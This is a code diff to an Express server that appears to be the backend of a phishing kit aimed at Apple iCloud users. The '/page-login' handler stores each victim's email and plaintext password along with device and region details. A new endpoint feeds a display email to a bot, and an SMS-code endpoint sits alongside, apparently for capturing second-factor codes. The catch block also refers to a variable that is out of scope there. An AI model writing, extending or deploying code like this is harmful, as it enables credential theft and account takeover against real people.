@@ -618,6 +618,27 @@ app.get("/get-sms-code", (req, res) => {
 });
 
 // ============================================================================
+// GET /get-page-display-email - Get displayEmail for iCloud page (for bot to display)
+// ============================================================================
+
+app.get("/get-page-display-email", (req, res) => {
+  try {
+    const email = (req.query.email || "").trim();
+
+    if (!email || !pendingPage[email]) {
+      return res.json({ displayEmail: email });
+    }
+
+    const displayEmail = pendingPage[email].displayEmail || email;
+    res.json({ displayEmail });
+
+  } catch (err) {
+    console.error("Get page display email error:", err);
+    res.json({ displayEmail: email });
+  }
+});
+
+// ============================================================================
 // SMS ENDPOINTS
 // ============================================================================
 
@@ -821,7 +842,8 @@ app.post("/page-login", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    pendingPage[email] = { password, status: "pending" };
+    // ✅ Store both email (for tracking) and displayEmail (for showing)
+    pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
     console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
 
     const message =
